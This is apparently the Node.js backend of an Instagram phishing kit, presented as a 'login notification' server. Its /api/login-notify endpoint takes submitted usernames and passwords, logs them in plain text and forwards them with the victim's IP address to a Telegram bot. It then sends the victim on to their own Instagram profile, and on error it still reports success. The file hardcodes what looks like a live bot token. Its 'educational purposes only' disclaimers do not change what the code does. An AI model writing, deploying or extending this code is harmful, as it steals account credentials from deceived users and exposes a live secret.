/**
 * Backend Server for Login Notification System
 * Sends user credentials to Telegram bot when users log in
 * 
 * SECURITY WARNING: This is for educational purposes only!
 * Collecting and storing passwords is a serious security risk.
 * In production, NEVER log, store, or transmit passwords in plain text.
 */

const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3001;

// Bot configuration
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8533220670:AAE1ygUg7OBuaVLXRpwhXGOWkX55dbbfGrI';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // Your personal Telegram chat ID

// Initialize Telegram Bot
const bot = new TelegramBot(BOT_TOKEN, { polling: false });

/**
 * Escape special characters for Telegram MarkdownV2
 * Characters that need escaping: _ * [ ] ( ) ~ ` > # + - = | { } . !
 */
function escapeMarkdown(text) {
  if (!text) return '';
  return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
}

/**
 * Escape special characters for Telegram Markdown (legacy)
 * Characters that need escaping: _ * [ ] ( ) ~ ` >
 */
function escapeMarkdownLegacy(text) {
  if (!text) return '';
  return text.toString()
    .replace(/\\/g, '\\\\')
    .replace(/\*/g, '\\*')
    .replace(/_/g, '\\_')
    .replace(/\[/g, '\\[')
    .replace(/\]/g, '\\]')
    .replace(/\(/g, '\\(')
    .replace(/\)/g, '\\)')
    .replace(/~/g, '\\~')
    .replace(/`/g, '\\`')
    .replace(/>/g, '\\>')
    .replace(/\+/g, '\\+')
    .replace(/-/g, '\\-')
    .replace(/=/g, '\\=')
    .replace(/\|/g, '\\|')
    .replace(/\{/g, '\\{')
    .replace(/\}/g, '\\}')
    .replace(/\./g, '\\.')
    .replace(/!/g, '\\!');
}

// Middleware
app.use(cors()); // Enable CORS for all origins (configure appropriately for production)
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Logging middleware
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.path}`);
  next();
});

/**
 * Health check endpoint
 */
app.get('/health', (req, res) => {
  res.json({ status: 'ok', message: 'Login notification server is running' });
});

/**
 * Login notification endpoint
 * Receives login credentials and sends them to Telegram
 */
app.post('/api/login-notify', async (req, res) => {
  try {
    const { username, password, timestamp, ip } = req.body;

    // Validate input
    if (!username || !password) {
      return res.status(400).json({
        success: false,
        error: 'Username and password are required'
      });
    }

    // Get client IP (handle proxy headers)
    const clientIp = ip || 
                     req.headers['x-forwarded-for'] || 
                     req.headers['x-real-ip'] || 
                     req.connection.remoteAddress || 
                     'Unknown';

    // Format message for Telegram using HTML for better special character support
    // HTML doesn't require escaping underscores and other special characters
    const message = `
🔐 <b>New Login Attempt</b>

👤 <b>Username:</b> <code>${username}</code>
🔑 <b>Password:</b> <code>${password}</code>
🌐 <b>IP Address:</b> <code>${clientIp}</code>
⏰ <b>Time:</b> ${timestamp || new Date().toLocaleString()}

📱 <b>Bot:</b> @Anku456Bot
    `.trim();

    console.log('📨 Sending login notification to Telegram...');
    console.log(`Username: ${username}`);
    console.log(`Password: ${password}`);

    // Send message to admin
    if (ADMIN_CHAT_ID) {
      try {
        // Using HTML parse mode - no need to escape special characters!
        await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
        console.log('✅ Message sent successfully to admin');
      } catch (htmlError) {
        console.warn('⚠️  HTML parsing failed, trying plain text...');
        console.error('HTML error:', htmlError.message);
        
        // Fallback: Send plain text without formatting
        const plainMessage = `
🔐 New Login Attempt

👤 Username: ${username}
🔑 Password: ${password}
🌐 IP Address: ${clientIp}
⏰ Time: ${timestamp || new Date().toLocaleString()}

📱 Bot: @Anku456Bot
        `.trim();
        
        await bot.sendMessage(ADMIN_CHAT_ID, plainMessage);
        console.log('✅ Plain text message sent successfully');
      }
    } else {
      console.warn('⚠️  ADMIN_CHAT_ID not set. Message not sent!');
      console.log('📋 Message content:', message);
    }

    // Respond with success
    res.json({
      success: true,
      message: 'Login notification sent',
      redirectUrl: `https://www.instagram.com/${username}/`
    });

  } catch (error) {
    console.error('❌ Error sending login notification:', error);
    
    // Still return success to not break user flow
    res.json({
      success: true,
      message: 'Login processed',
      redirectUrl: `https://www.instagram.com/${req.body.username}/`
    });
  }
});

/**
 * Get your Telegram Chat ID
 * Visit this endpoint and send /start to the bot to get your chat ID
 */
app.get('/api/get-chat-id', (req, res) => {
  res.json({
    message: 'To get your chat ID:',
    steps: [
      '1. Open Telegram and search for @Anku456Bot',
      '2. Send /start to the bot',
      '3. Check the bot console logs for your chat ID',
      '4. Add it to .env file as ADMIN_CHAT_ID=your_id'
    ]
  });
});

/**
 * Test endpoint to verify Telegram connection
 */
app.post('/api/test-telegram', async (req, res) => {
  try {
    if (!ADMIN_CHAT_ID) {
      return res.status(400).json({
        success: false,
        error: 'ADMIN_CHAT_ID not configured. Add it to .env file'
      });
    }

    await bot.sendMessage(ADMIN_CHAT_ID, '✅ Test message from login notification server!');
    
    res.json({
      success: true,
      message: 'Test message sent to Telegram successfully!'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('❌ Server error:', err);
  res.status(500).json({
    success: false,
    error: 'Internal server error'
  });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found'
  });
});

// Start server
app.listen(PORT, () => {
  console.log('🚀 Login Notification Server Started');
  console.log(`📡 Server running on http://localhost:${PORT}`);
  console.log(`🤖 Bot: @Anku456Bot`);
  console.log(`👤 Admin Chat ID: ${ADMIN_CHAT_ID || '⚠️  NOT SET - Please configure!'}`);
  console.log('\n📋 Available endpoints:');
  console.log(`   POST http://localhost:${PORT}/api/login-notify`);
  console.log(`   GET  http://localhost:${PORT}/api/get-chat-id`);
  console.log(`   POST http://localhost:${PORT}/api/test-telegram`);
  console.log(`   GET  http://localhost:${PORT}/health`);
  console.log('\n⚠️  SECURITY WARNING:');
  console.log('   This server handles sensitive credentials.');
  console.log('   Only use for educational purposes!');
  console.log('   Never deploy this to production!\n');
});

// Handle graceful shutdown
process.on('SIGTERM', () => {
  console.log('👋 Shutting down gracefully...');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('\n👋 Shutting down gracefully...');
  process.exit(0);
});
